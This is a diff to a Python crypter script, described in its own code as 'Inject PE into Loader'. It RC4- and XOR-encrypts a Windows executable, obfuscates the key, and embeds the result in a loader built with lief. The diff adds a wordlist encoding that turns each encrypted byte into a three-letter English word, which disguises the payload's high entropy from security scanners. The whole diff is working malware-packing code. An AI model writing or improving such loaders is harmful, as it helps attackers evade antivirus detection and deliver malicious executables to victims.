@@ -12,6 +12,19 @@ KEY_LENGTH = 16
 PRIME_LENGTH = 8
 PRIME_TOP = 60124
 
+wordlist = ["raw", "moo", "zed", "nun", "hin", "ado", "vim", "lip", "tic", "pet", "xis", "tux", "jut", "zap", "fry", "ewe", "ice", "ink", "ask", "lay", "pod", "yam",
+            "dig", "paw", "den", "ohm", "jay", "cog", "vex", "rot", "mop", "fad", "ode", "jow", "joy", "thy", "hex", "eel", "ape", "hum", "wop", "era", "jag", "toe",
+            "zit", "nab", "cop", "jug", "mad", "oaf", "zag", "tat", "yen", "gym", "hop", "gab", "jab", "end", "tug", "tax", "bud", "bag", "wok", "bug", "yak", "god",
+            "tad", "off", "fee", "mud", "nap", "hid", "dew", "add", "jar", "rag", "bus", "new", "hog", "vat", "jib", "jog", "gin", "red", "jam", "tee", "nut", "ale", 
+            "sue", "arc", "top", "fin", "fly", "ear", "awe", "pen", "jig", "ate", "qua", "cam", "gut", "pad", "cob", "saw", "lid", "haw", "wag", "ram", "cow", "any",
+            "bay", "elk", "owl", "aim", "rut", "dug", "yet", "cup", "fit", "oar", "pun", "ebb", "won", "coy", "urn", "fog", "kin", "qed", "sty", "tag", "gig", "wad",
+            "vet", "ore", "fed", "jot", "bop", "gay", "run", "ivy", "tan", "lob", "tab", "gun", "fix", "big", "sit", "gem", "din", "sum", "hip", "cod", "rib", "bun",
+            "eon", "zip", "bib", "van", "zoo", "dam", "ion", "woe", "nib", "hen", "ash", "yes", "dot", "rum", "ago", "mug", "icy", "sky", "ova", "ton", "ill", "nip",
+            "ham", "jet", "tap", "sax", "lot", "bee", "sob", "mob", "sir", "why", "toy", "foe", "maw", "bet", "lei", "bid", "met", "bye", "box", "vie", "elm", "rue",
+            "bed", "yep", "rye", "rub", "him", "mix", "wax", "boo", "way", "axe", "hut", "oak", "dye", "lap", "wed", "lug", "eve", "cub", "nod", "oat", "ace", "cab",
+            "awl", "kit", "hay", "ran", "fig", "car", "dim", "log", "gad", "fox", "imp", "bog", "dip", "wry", "gas", "cot", "keg", "dab", "one", "air", "pat", "yip",
+            "few", "yap", "nag", "gum", "pan", "orb", "ant", "zen", "hob", "gap", "pew", "men", "egg", "pal"]
+
 def prime_number(n):
     is_prime = [True] * (n+1)
     is_prime[0] = is_prime[1] = False
@@ -22,7 +35,7 @@ def prime_number(n):
     return max([number for number, prime in enumerate(is_prime) if prime])
 
 
-def encrypt_file_rc4_xor(input_data):
+def encrypt_file_rc4_xor_word(input_data):
     # Get Key from random hash bytes
     hash_object = hashlib.sha256(input_data)
     hash_bytes = hash_object.digest()
@@ -41,6 +54,12 @@ def encrypt_file_rc4_xor(input_data):
         encrypted_byte = rc4_crypted_data[i] ^ key_byte
         xor_crypted_data.append(encrypted_byte)
 
+    encrypted_buf = bytearray()
+    for i in range(len(xor_crypted_data)):
+        byte_int = int(xor_crypted_data[i])
+        encoded_word = bytearray(wordlist[byte_int].encode('ascii'))
+        encrypted_buf.extend(encoded_word)
+
     # Obfuscate key
     obfu_key = bytearray()
     prime_num_bytes = prime_num.to_bytes(PRIME_LENGTH, byteorder='little')
@@ -54,7 +73,7 @@ def encrypt_file_rc4_xor(input_data):
     print("Used Key: ", key_hex_str)
     print("Obfuscated Key: ", obfu_key_hex_str)
 
-    return (xor_crypted_data, obfu_key_hex_str)
+    return (encrypted_buf, obfu_key_hex_str)
 
 def main():
     parser = argparse.ArgumentParser(description='Inject PE into Loader')
@@ -69,7 +88,9 @@ def main():
     with open(args.input, "rb") as f:
         input_data = f.read()
 
-    (encrypted_data, key_str) = encrypt_file_rc4_xor(input_data)
+    print("Decoded Last Byte:", hex(input_data[0]), "Decoded First Byte:" , hex(input_data[-1]))
+
+    (encrypted_data, key_str) = encrypt_file_rc4_xor_word(input_data)
 
     encrypted_data_lst = list(encrypted_data)
 
@@ -94,8 +115,9 @@ def main():
     lief_PE_builder.build()
     lief_PE_builder.write(args.o)
 
-    encrypted_size = len(encrypted_data)
+    encrypted_size = len(encrypted_data_lst)
 
+    print("Original size ", len(input_data))
     print("Encrypted size: ", encrypted_size)
     with open(args.o, "ab") as new_loader_file:
         new_loader_file.write(encrypted_size.to_bytes(8, byteorder='little'))
